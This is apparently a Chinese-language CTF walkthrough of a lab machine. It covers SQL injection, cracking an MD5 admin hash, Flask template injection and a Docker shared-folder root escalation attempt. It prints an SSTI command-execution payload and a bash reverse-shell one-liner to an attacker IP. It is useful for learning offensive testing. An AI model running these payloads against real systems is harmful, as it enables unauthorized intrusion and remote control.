只有一个tcp 80 端口开放，并且有域名，那么在 c:\\windows\\system32\\drivers\\etc\\hosts 文件中添加ip对应的域名即可成功访问。

此时扫描目录和子域名爆破同时进行：

### 2.漏洞利用

#### 0x01. SQL注入

来到profile界面之后，发现页面只有一个重置密码的功能，并无其他资料修改的功能

抓包 修改密码 看看有没有越权

![](../Images/81b4f81451f981261bab926980a2c015.png)

好！没有越权操作。

抠了一下脑壳，突然想到，blog页面的get传参sql注入测试过没有，但是表单这里还有没有测试sql注入呀。

既然说出来了那么就要有行动，RUSH！

![](../Images/43899f09cb623fbfc79f8eb9b9d1c773.png)

**Login Success！**

刚刚页面有欢迎语句，搜索一下Welcome看看现在是什么身份。

![](../Images/d5589179d417327f289c6101147a8cd5.png)

这里有三个用户，admin、kami、kam1 后面两个都是我注册的。

现在去登录页面，因为前端js校验邮箱正确与否，输入正确邮箱格式抓包修改参数即可。

![](../Images/2aa00d54346573687b362574337d129a.png)

虽然成功进入了后台，但是并没有啥卵用啊，啥功能也没有。

还是回到sql注入找找信息吧。

![](../Images/1376ab5196c5cb13bed366853adfeef3.png)

逐字猜解，有四个字段，回显点在第四个字段

![](../Images/deab4090d47ed67195228acec2398849.png)

![](../Images/fee8b9c3a0e0798c7d081ac07d6d0069.png)

![](../Images/82bfac9e414f96787209f1726e35f89a.png)

![](../Images/36faf2dd8d9efce948ad1629082611de.png)

![](../Images/d2c5fd93da53d8b001c60e08b5c11a6a.png)

因为之前爆用户的时候可以看到将三个用户名紧凑在一起，所以上面用分号隔开来了。

当前得到信息：当前用户并非dba权限，数据库中只有`main`、`information_schema`两个库，`user`表中有四个字段，分别是`id`，`email`，`password`，`name`

查询一下这个表里面的所有东西

![](../Images/c2d49e147928afd376bdde77762b9747.png)

password值是md5加密的，去撞库看看能不能得到明文

![](../Images/3f209d4b1a6cc44cf9ca77fdf83810f0.png)

得到密码：superadministrator

#### 0x02. SSTI(模板注入)

通过管理员登录之后可以看到原先右上角的两个图标变成了三个，多出来一个小齿轮，鼠标指针移动到这发现是跳转到一个子域名，在hosts文件中添加后，跳转访问。

![](../Images/78ab62088eca590205400b0c92bf0705.png)

![](../Images/96a3ab91bfe6531a512f389a75cbedfa.png)

直接就是一个flask登录表单页面，没有其他的花里胡哨的东西，同样`admin`，pass：`superadministraotr`登录成功

![](../Images/12cc79278e20b089326de00904fa45a8.png)

![](../Images/ba0ddb6f77fd5c404d8fea0f3d25d0f5.png)

登陆之后发现文件上传、添加用户、搜索等功能，但是经过测试，这些都是指向页面本身，并没有其他作用

![](../Images/49f8b459293fa684ddd7f36023c59fc9.png)

好在这里还有一个设置页面，可以修改用户名，插入一条xss语句

![](../Images/d8b4cd4a52b2e54dda6b94fa7d91e5a0.png)

![](../Images/91f346302876e2ed64565ffe8111c1f3.png)

页面编程语言依旧是python，同样使用的`flask`

flask存在一个SSTI，那么现在来测试一下便知：poc：{{9\*9}} 如果得到结果81，则存在SSTI

![](../Images/775e0faafaaf42d1bcfc3dfc58a391a9.png)

![](../Images/d1f303651b177ad6b15ec971b1e971b2.png)

测试结果为81，当前存在SSTI

既然存在SSTI，接下来就是执行系统命令的阶段了，原理方面就是通过python调用本身的类中的函数去执行一些自己想要执行的操作，比如执行命令，文件读取等。

```
payload:
{{ namespace.\_\_init\_\_.\_\_globals\_\_.os.popen('id').read() }}
```

  

  

![](../Images/5f343953966f54af0648c5ec0b5a7a7a.png)

执行id命令成功，现在反弹一个shell过来。

```
exploit:
{{namespace.\_\_init\_\_.\_\_globals\_\_.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.28/1234 0>&1"').read()}}
```

![](../Images/6c3673d0bae802117c90a4295cda38d9.png)

![](../Images/aa65472e86c04f244f8dc2bc9a30b229.png)

### 3. 权限提升

来到根目录，ls -la一下发现有一个 **.dockerenv** 看来这是在docker中了。

![](../Images/c27b08648a814af23a68cc0fc0f1e61b.png)

![](../Images/d15552419b20c4d2ca3bb3ffd1f3f39a.png)

通过ifconfig可以看到这里还有另外一个ip：172.19.0.2，循环ping一下这个网段有几台主机

![](../Images/326b064049850f76bf179674c6191f60.png)

只发现了还有一个 172.19.0.1，多半是docker的主机了。

![](../Images/ec97504d527c15fbfadfebdfbbd8661d.png)

循环ping一下这台机器的所有端口，只有22和80端口开放。

尝试ssh，刚刚在/home/augustus中找到了user.txt，这里直接用这个用户吧

![](../Images/072be510118d4a623e9a5f5e7ef770e6.png)

登录成功，账号augustus，密码superadministrator

![](../Images/15bc5559bab60deb2b7a41632789333a.png)

**hostname -i** 确定现在这台机器就是靶机，查看一下进程果然有docker进程

![](../Images/b003b0dc17068a5388946107daab2321.png)

![](../Images/bcbde160893eb91481f3302fa7c4e481.png)

![](../Images/a11dc77c3fd5c85ecd6b7e123e84820b.png)

这边用户ls -la 列出来的文件 .bash\_logout .bashrc .profile和docker中的文件大小一模一样，但是时间差了一个小时

那么我试试是否是在主机中创建文件，同样docker中也会有

![](../Images/641ee2080cf2fbc7e83c4e612f07fe9f.png)

![](../Images/827e34c38ec637d09eaba5edd132bebf.png)

可以看到，我在主机中创建了一个1.txt这时候再去docker中查看文件，docker中也生成了一个1.txt

那我再在docker中创建一个文件，看看是否主机会有反应呢。

![](../Images/d3c2162bdd004c13ec880c15d6645213.png)

![](../Images/85c68fbadd479ad3487e7e845cd03c46.png)

可以看到我在docker中创建的txt跟上面一样，同时在宿主机中创建了，并且是root的权限

既然现在文件可以同步，可以尝试将宿主机的bash cp到augustus的目录，然后再在docker中将其权限设置为root去宿主机运行是否能得到一个root的shell呢

![](../Images/f4fa23523c4b04c742ed1da02f5be604.png)
